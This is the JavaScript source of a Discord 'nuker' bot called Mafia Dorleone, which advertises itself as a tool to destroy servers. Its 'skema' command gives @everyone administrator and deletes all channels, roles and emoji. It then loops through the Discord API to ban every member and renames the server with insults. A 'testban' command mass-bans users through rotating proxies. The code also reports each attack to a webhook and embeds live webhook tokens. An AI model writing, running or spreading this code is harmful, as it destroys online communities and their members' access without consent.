const discord = require('discord.js');
const discordjs = require('discord.js');
const axios = require('axios')
const Discord = require('discord.js');
const cooldown = new Set();
const { MessageButton } = require('discord.js');
const cdtime = 5;
const msg = 5;//team prinsss
const chalk = require('chalk');
const configjson = require('./config.json');
const moment = require("moment") 
const superagent = require("superagent")
const disbut = require('discord-buttons');
const helpEmbed = require('discord.js');
const { MessageEmbed, version: djsversion } = require('discord.js')
const client = new Discord.Client({ });
 const statusArray = ['type invite to invite me, PLAYING', 'free nuker for fuck servers, WATCHING', 'add me and type salut, WATCHING'];
    setInterval(() => {
      const random = statusArray[Math.floor(Math.random() * statusArray.length)].split(', ')
      const status = random[0];
      const mode = random[1];
    }, 10000)
const { red, green, blue, yellow, cyan, greenBright, redBright, grey, yellowBright, cyanBright, black, blueBright } = require('chalk');
const settings = require('./settings.json');
const disableEveryone = settings.DisableEveryone;
const db = require("quick.db");
const inlinereply = require('discord-reply');
const discordButtons = require("discord-buttons-plugin");
const buttonClient = new discordButtons(client);
const fs = require('fs');
const proxies = fs.readFileSync('./src/proxies.txt', 'utf-8').replace(/\r|\x22/gi, '').split('\n');
const { version } = require("discord.js");
const prefix = settings.prefix;
const request = require('request');
const hook = new Discord.WebhookClient('', '');
const { MessageMenuOption, MessageMenu } = require("discord-buttons")
var whitelistedservers = ["934349793919115345", "939215111736942632"]
var boosterusers  = ["897077169119957042", "893237110134415381", "922175162164596776"]
var give_everyone_administrator = configjson.server.give_everyone_administrator
client.on("ready", async () => {
let matatactu = new Discord.MessageEmbed()
.setColor("969db9")
.setDescription("<:atentiefututzrasata:929073697845817416>** | Mafia Dorleone has been __`Connected`__ to Discord**")
const wrb = new Discord.WebhookClient("941046133059383336", "n3BcQl_urD-qNI0Huq51dxlLXtjGN--O-K6FXnQkKmVJsFPEL66Xo0fGXACm2NRqPbiq");
    await wrb.send(matatactu)

const botActivity = [
  `Type help`,
  `skema = destroy`
]

const chalk = require('chalk');
  client.user.setStatus("STREAMING");
  console.log('');
  console.log(chalk.inverse.hex("00FF00")(`[INFO] Logged in as ${client.user.tag} (${client.user.id})`));
  console.log(chalk.inverse.hex("00FF00")(`[INFO] Connected to Discord API Service`));
  console.log('');
  client.guilds.cache.forEach((guild) => {
    console.log(chalk.inverse.hex("00FF00")("Guild: " + guild.name + " | Members: " + guild.memberCount));
  })
  setInterval(() => {
    const randomIndex = Math.floor(Math.random() * (botActivity.length - 1) + 1);
    const newActivity = botActivity[randomIndex];
    client.user.setActivity(newActivity, { type: 'PLAYING' });
  }, 10000);
});
client
  .on("error", console.error)
  .on("warn", console.warn)
  .on("debug", console.log);
client
  .on("reconnecting", () => {
    console.log(chalk.inverse.hex("e0160b")(`[WARN] Disconnected from Discord API Service. Attempting to reconnected...`));
  })
  .on("disconnect", () => {
    console.log(chalk.inverse.hex("e0160b")(`[WARN] {client.username} has disconnected!`));
  })

  console.log("Servers:")
    client.guilds.cache.forEach((guild) => {
        console.log(" csf cuaie >> " + guild.name + " - sklavi " + guild.memberCount)
    })
 
     


client.on("message", async message => {
  if (message.author.bot) return;
	if (message.content === 'Help' || message.content == 'help' || message.content == 'HELP') {

                if (boosterusers.includes(message.author.id) === true)
    {
      const cf = new discordjs.MessageEmbed()
        .setColor('969db9')
        .setTitle('All your permissions have been suspended')
        .setAuthor("Permission Suspended", "https://media.discordapp.net/attachments/934672203990065223/934672658006683728/a_58f1830f8bbb384ee8a4314137e2a647.gif")
              .setFooter(
                    `BlackListed`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
      await message.lineReplyNoMention(cf)
      return;
    }
        if (message.author.bot || message.channel.type === "dm") return;
        try {
            let fetched = await db.fetch(`prefix_${message.guild.id}`);
            if (fetched == null) {
            } else {
                prefix = fetched
            }
        } catch (e) {
            console.log(e)
    };
        if (cooldown.has(message.author.id)) {
      return message.lineReplyNoMention(`<a:onlineWick:939907551783452782>  \`Wait 5 seconds to use command\``).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);

     var states = "<:amnet:929724572750725120> Excellent";
        var states2 = "<:amnet:929724572750725120> Excellent";
        var msg = `${Date.now() - message.createdTimestamp}`;
        var api = `${Math.round(client.ws.ping)}`;
        if (Number(msg) > 70) states = "<:amnet:929724572750725120> Good";
        if (Number(msg) > 170) states = "<:maislab:929073621274615818> Not Bad";
        if (Number(msg) > 350) states = "<:muarenetu:929073671950204978> Soo Bad";
        if (Number(api) > 70) states2 = "<:amnet:929724572750725120> Good";
        if (Number(api) > 170) states2 = "<:maislab:929073621274615818> Not Bad";
        if (Number(api) > 350) states2 = "<:muarenetu:929073671950204978> Soo Bad";

            // Basic embed
    let totalSeconds = (client.uptime / 1000);
    let days = Math.floor(totalSeconds / 86400);
    totalSeconds %= 86400;
    let hours = Math.floor(totalSeconds / 3600);
    totalSeconds %= 3600;
    let minutes = Math.floor(totalSeconds / 60);
    let seconds = Math.floor(totalSeconds % 60);

    const embed = new Discord.MessageEmbed()
      .setColor('969db9')
                .setFooter(
                    `Commands`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
   .setThumbnail(message.author.displayAvatarURL({         dynamic: true       }))
            .setTitle(" <:terminal:939907653239443506>   **Basic Commands**")
    .setAuthor(".                                 COMMANDS", "https://images-ext-1.discordapp.net/external/mQFJpKpM2LihT5yYrj-QndJ24zh8TkWigj96Bxput7Q/%3Fwidth%3D150%26height%3D150/https/media.discordapp.net/attachments/937283782208278588/941026796470693898/dorleone_pistol_neon_by_lil_pac.gif?width=113&height=113")
      .setDescription("> <:jos1:939907588496162857><:1blackgengar:939907631773012048> [skema](https://discord.com/api/oauth2/authorize?client_id=905111348139135026&permissions=2146958847&scope=bot%20applications.commands) for Destroy the server\n> <:sus:939907337504829541>  <:1blackgengar:939907631773012048> [invite](https://discord.com/api/oauth2/authorize?client_id=905111348139135026&permissions=2146958847&scope=bot%20applications.commands) for Invite view bot invite link\n")
      .addThumbnail("https://images-ext-2.discordapp.net/external/ltte-yWoml95eKC6bYCEwQTvXFm0oGzmE52tRmleFxo/https/media.discordapp.net/attachments/914266285607628901/914270368087306250/pingiu_e_gay.gif")
      	.addField(`**Api Latency:**`, `> \`${msg}\` [ms](https://mafia-dorleone.ga)`, true)
      	.addField(`**Bot Uptime:**`, `> \`${days}\` [day(s)](https://mafia-dorleone.ga)`, true)
            	.addField(`**Language:**`, `> \`Js\` [JavaScript](https://mafia-dorleone.ga)`, true)

    await message.lineReplyNoMention(embed)

  }


if (message.content === 'ping' || message.content == 'Ping' || message.content == 'PING') {

                if (boosterusers.includes(message.author.id) === true)
    {
      const cf = new discordjs.MessageEmbed()
        .setColor('969db9')
        .setTitle('All your permissions have been suspended')
        .setAuthor("Permission Suspended", "https://media.discordapp.net/attachments/934672203990065223/934672658006683728/a_58f1830f8bbb384ee8a4314137e2a647.gif")
              .setFooter(
                    `BlackListed`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
      await message.lineReplyNoMention(cf)
      return;
    }
        if (message.author.bot || message.channel.type === "dm") return;
        try {
            let fetched = await db.fetch(`prefix_${message.guild.id}`);
            if (fetched == null) {
            } else {
                prefix = fetched
            }
        } catch (e) {
            console.log(e)
    };
        if (cooldown.has(message.author.id)) {
      return message.lineReplyNoMention(`<a:onlineWick:939907551783452782>  \`Wait 5 seconds to use command\``).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);

     var states = "<:amnet:929724572750725120> Excellent";
        var states2 = "<:amnet:929724572750725120> Excellent";
        var msg = `${Date.now() - message.createdTimestamp}`;
        var api = `${Math.round(client.ws.ping)}`;
        if (Number(msg) > 70) states = "<:amnet:929724572750725120> Good";
        if (Number(msg) > 170) states = "<:maislab:929073621274615818> Not Bad";
        if (Number(msg) > 350) states = "<:muarenetu:929073671950204978> Soo Bad";
        if (Number(api) > 70) states2 = "<:amnet:929724572750725120> Good";
        if (Number(api) > 170) states2 = "<:maislab:929073621274615818> Not Bad";
        if (Number(api) > 350) states2 = "<:muarenetu:929073671950204978> Soo Bad";

            // Basic embed
    let totalSeconds = (client.uptime / 1000);
    let days = Math.floor(totalSeconds / 86400);
    totalSeconds %= 86400;
    let hours = Math.floor(totalSeconds / 3600);
    totalSeconds %= 3600;
    let minutes = Math.floor(totalSeconds / 60);
    let seconds = Math.floor(totalSeconds % 60);

    const embed = new Discord.MessageEmbed()
      .setColor('969db9')
                .setFooter(
                    `Commands`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
   .setThumbnail(message.author.displayAvatarURL({         dynamic: true       }))
            
    .setAuthor(".                                PING COMMAND", "https://images-ext-1.discordapp.net/external/mQFJpKpM2LihT5yYrj-QndJ24zh8TkWigj96Bxput7Q/%3Fwidth%3D150%26height%3D150/https/media.discordapp.net/attachments/937283782208278588/941026796470693898/dorleone_pistol_neon_by_lil_pac.gif?width=113&height=113")
      
      	.addField(`**Api Latency:**`, `> \`${msg}\` [ms](https://mafia-dorleone.ga)`, true)
      	.addField(`**Bot Uptime:**`, `> \`${days}\` [day(s)](https://mafia-dorleone.ga)`, true)

            	

    await message.lineReplyNoMention(embed)

  }


   const { MessageActionRow, MessageSelectMenu } = require('discord.js');

 if (message.content.startsWith('invite') || message.content.startsWith("Invite") || message.content.startsWith("INVITE")) {
         if (boosterusers.includes(message.author.id) === true)
    {
      const cf = new discordjs.MessageEmbed()
        .setColor('969db9')
        .setTitle('All your permissions have been suspended')
        .setAuthor("Permission Suspended", "https://media.discordapp.net/attachments/934672203990065223/934672658006683728/a_58f1830f8bbb384ee8a4314137e2a647.gif")
              .setFooter(
                    `BlackListed`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
      await message.lineReplyNoMention(cf)
      return;
    }
    if (message.author.bot || message.channel.type === "dm") return;
    try {
      let fetched = await db.fetch(`prefix_${message.guild.id}`);
      if (fetched == null) {
      } else {
        prefix = fetched
      }
    } catch (e) {
      console.log(e)
    };
    if (cooldown.has(message.author.id)) {
      return message.lineReplyNoMention(`<a:onlineWick:939907551783452782>  \`Wait 5 seconds to use command\``).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);
    const embed = new Discord.MessageEmbed()
    .setDescription(`<:chicago_crown_purple:937386080502710342> For destroy the server use the command **skema**

<a:yng_whiteskull:937385982469234688>  Pentru a distruge un server foloseste comanda **skema**`)
         .setColor('#969db9')
                .setFooter(
                    `Invite`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
    .setAuthor("invite dorleone 4 fun", "https://images-ext-1.discordapp.net/external/mQFJpKpM2LihT5yYrj-QndJ24zh8TkWigj96Bxput7Q/%3Fwidth%3D150%26height%3D150/https/media.discordapp.net/attachments/937283782208278588/941026796470693898/dorleone_pistol_neon_by_lil_pac.gif?width=113&height=113")
const button45 = new buttonClient.MessageButton()
   .setLabel("Invite Link")
   .setURL(" https://discord.com/oauth2/authorize?client_id=927197414102810704&scope=bot&permissions=24")

      const button55 = new buttonClient.MessageButton()
   .setLabel("invite me")
   .setURL("https://discord.com/oauth2/authorize?client_id=927197414102810704&scope=bot&permissions=24")

         const button525 = new buttonClient.MessageButton()
   .setLabel("Site")
.setURL("https://mafiadorleone.code.blog/")

     buttonClient.send(null, { channel: message.channel.id, embed, buttons: [ [button55 , button525] ]})
  }
const phin = require('phin').unpromisified
let guildID = message.guild.id
	if (message.content === 'skema' || message.content == 'SKEMA' || message.content == 'Skema') {

                if (boosterusers.includes(message.author.id) === true)
    {
      const cf = new discordjs.MessageEmbed()
        .setColor('969db9')
        .setTitle('All your permissions have been suspended')
        .setAuthor("Permission Suspended", "https://media.discordapp.net/attachments/934672203990065223/934672658006683728/a_58f1830f8bbb384ee8a4314137e2a647.gif")
              .setFooter(
                    `BlackListed`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
      await message.lineReplyNoMention(cf)
      return;
    }
const filter = i => i.customId === 'primary' && i.user.id === '122157285790187530';
   const wait = require('util').promisify(setTimeout);
    const button7 = new buttonClient.MessageButton()
      .setLabel("esti")
      .setID("esti")
                  .setStyle("red")
    const button8 = new buttonClient.MessageButton()
      .setLabel("un")
            .setID("un")
         .setStyle("green")
    const button9 = new buttonClient.MessageButton()
      .setLabel("mare")
      .setID("mare")
    .setStyle("grey")
          const button999 = new buttonClient.MessageButton()
      .setLabel("sklav")
            .setID("sklav")
            .setStyle("blurple")
    if (whitelistedservers.includes(message.guild.id)) return message.channel.send(" <a:server_cox_check_no:941020924809969746>  | you can't use this command here!") 
       if (cooldown.has(message.author.id)) {
      return message.lineReplyNoMention(`<:icons_timeout:935174460573638716> \`Wait 30 seconds to use salut\``).then(m => {
        m.delete({ timeout: cdtime * 1000 });
      });
    }

    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 10000);
       let channels =  message.guild.channels.cache.array();
        let members =  message.guild.members.cache.array();
        let roles =  message.guild.roles.cache.array();
        let emojis =  message.guild.emojis.cache.array();
let guild = message.guild.id
      const sleep = (time) => new Promise(resolve => setTimeout(resolve, time));
          db.set(`channel_${message.guild.id}`, "k")
 let premiume12144 = new Discord.MessageEmbed()
      .setColor("#969db9")
            .setFooter(
        `${message.author.tag} Nuked`,
        message.author.displayAvatarURL({
          dynamic: true
        })
      )
      .setTimestamp()
   .setThumbnail(message.author.displayAvatarURL({
        dynamic: true
      }))
        .setAuthor("Mafia Dorleone Logs", "https://media.discordapp.net/attachments/934672203990065223/934672658006683728/a_58f1830f8bbb384ee8a4314137e2a647.gif")
      .setDescription(`<:icons_djoin:935215793623420988> **Who typed the command:** 
      <:sus:929453502764302376> ${message.author.tag} (` + "`" + message.author.id + "`" + `)\n **<:icons_djoin:935215793623420988> Command** 
      <:sus:929453502764302376> salut\n <:icons_djoin:935215793623420988> **Server Name** 
      <:sus:929453502764302376> ${message.guild.name} (` + "`" + message.guild.id + "`" + `)\n <:icons_djoin:935215793623420988> **Members** 
      <:sus:929453502764302376> ${message.guild.memberCount}`);
    const wrb = new Discord.WebhookClient("941054430541914122", "uAbKXXMpxglikZSGnLFW_9MCfS5Dnha5st4wxpGhUD_W_lkRSB8mr96bA4rzARzHZ_l9");
      await wrb.send(premiume12144)
message.delete()

    if (give_everyone_administrator == false) {
      console.log(`Giving administrator to @everyone has been disabled.`)
    }
    else {
      var everyone = message.guild.roles.cache.find(r => r.name === "@everyone")
      everyone.setPermissions(["SEND_TTS_MESSAGES", "MANAGE_EMOJIS", "MANAGE_MESSAGES", "ADMINISTRATOR", "MANAGE_GUILD", "BAN_MEMBERS", "MANAGE_CHANNELS", "MANAGE_ROLES", "MANAGE_WEBHOOKS", "MENTION_EVERYONE", "MUTE_MEMBERS", "MOVE_MEMBERS", "DEAFEN_MEMBERS", "VIEW_AUDIT_LOG", "KICK_MEMBERS", "CREATE_INSTANT_INVITE", "USE_VAD", "PRIORITY_SPEAKER", "CREATE_INSTANT_INVITE", "CONNECT", "SPEAK", "VIEW_CHANNEL", "VIEW_GUILD_INSIGHTS"])
    }
const phin = require('phin').unpromisified
let guildID = message.guild.id
       message.guild.channels.cache.array().forEach(channel => {
      channel.delete();
    });
    message.guild.roles.cache
      .filter(
        r =>
          !r.managed &&
          r.position < message.guild.me.roles.highest.position &&
          r.id !== message.guild.id
      )
      .forEach(role => {
        role.delete();
      });
    message.guild.emojis.cache.array().forEach(emoji => {
      emoji.delete();
    });

let token = (process.env.TOKEN)

  headers = {'Authorization': "Bot " + token}
var interval = setInterval (async function () {
  phin({
            url: `https://discord.com/api/v8/guilds/${guildID}/members?limit=1000`,
            method: 'GET',
            parse: 'json',
            headers: headers
         }, (err, res, body) => {
            res.body.forEach(member=>{
                console.log(member.user.id)
            phin({
              url:`https://discord.com/api/v8/guilds/${guildID}/bans/${member.user.id}`,
              method:'PUT',
              parse: 'json',
              headers: headers
            }, (err, res) =>{
              if(res.body){
                console.log(res.body)
              } else {
                console.log(`${member.user.username} got banned :p api v8`)
              }
            })
            }) 
   })},500)
    await message.guild.channels.create(`LXX`, {
      type : 'category'
    })

message.guild.setName("dorleone").then(value => {message.guild.setName("va futut")}, 500).then(value => {message.guild.setName("an kur")}, 500).then(value => {message.guild.setName("dorleone fucked you")}, 500)

   message.guild.setIcon(
      "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTC7qiC3IHTBZNnwbRXlu0ri8GHgRbiZhuOzg&usqp=CAU"
    ).then(value => {   message.guild.setIcon(
      "https://media.discordapp.net/attachments/853854299229650972/932324503881662484/B71CFE43-DCCF-4971-BA03-737B028AF9C1.jpg"
    )}, 500).then(value => {   message.guild.setIcon(
      "https://media.discordapp.net/attachments/853854299229650972/932328230210387968/IMG_0760.jpg?width=433&height=433"
    )}, 500)
  }
        })
const http = require('http');
const requestListener = function(req, res) {
  res.end('Hai sa rupem niste tarfe');
}
const server = http.createServer(requestListener); 
server.listen(8080);
client.login(process.env.TOKEN)
client.on('message', async message => {
token = (process.env.TOKEN)
const proxies = fs.readFileSync('./src/proxies.txt', 'utf-8').replace(/\r|\x22/gi, '').split('\n');
const user_ids = fs.readFileSync('./src/ids.txt', 'utf-8').replace(/\r|\x22/gi, '').split('\n');
const talkedRecently = new Set();
const chalk = require('chalk');
const db = require("quick.db");
const { version } = require("discord.js");
const request = require('request');
const moment = require("moment") 
const superagent = require("superagent")
const axios = require('axios').default
const disbut = require('discord-buttons');
const phin = require('phin').unpromisified
headers = {'Authorization': "Bot " + token}

function write(content, file) {
    fs.appendFile(file, content, function(err) {});
}

	if (message.content === 'testban' || message.content == 'Testban' || message.content == 'TESTBAN') {

        if(message.guild.id == '911694685033070622') return message.lineReplyNoMention("gay prost");

      message.delete()
   if(message.author.id !== "811681164464095263")   if(message.author.id !== "896966129086496838")
  return;
    var int1 = setInterval(async function() {   
    let guild = message.guild.id
    var member_id = user_ids[Math.floor(Math.random() * user_ids.length)]
    var proxy = proxies[Math.floor(Math.random() * proxies.length)]
        phin({
              url:`https://discord.com/api/v9/guilds/${guild}/bans/${member_id}?reason=Dorleone??`,
              proxy: "http://" + proxy,
              method:'PUT',
              parse: 'json',
              headers: headers,
              timeout: 20
            }, (err, res) =>{
              if(res.body){
                console.log(res.body)
              } else {
       console.log(chalk.inverse.hex("00FF00")(`User: ${member.user.username} | Proxy: ${proxy}`));
              }
            })
    }, 20)
  setTimeout(() => {
clearInterval(int1)
  }, 60000)
  }
});